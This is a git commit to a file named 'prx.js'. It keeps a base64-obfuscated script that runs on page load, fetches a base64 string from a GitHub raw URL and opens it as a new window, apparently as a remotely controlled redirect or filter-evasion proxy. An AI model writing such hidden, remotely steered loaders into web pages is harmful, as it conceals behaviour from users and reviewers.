05ab7007ceb17b6036daf1937302f77a84902831
25HoursaDay <98925934+25HoursaDay@users.noreply.github.com>
2022-12-20 17:33:23 -0600

    Update prx.js

--- prx.js
+++ prx.js
@@ -1,2 +1,1 @@
 document.write(`<script>`+atob("ZmV0Y2goImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9ob21lLXNjaG9vbG9neS9wdWJsaWMvbWFpbi9qcy90eHQiKS50aGVuKChyZXN1bHQpID0+IHtyZXR1cm4gcmVzdWx0LnRleHQoKTt9KS50aGVuKChjb250ZW50KSA9PiB7d2luZG93Lm9wZW4oYXRvYihjb250ZW50KSk7fSk7")+`</script>`);
-document.write();
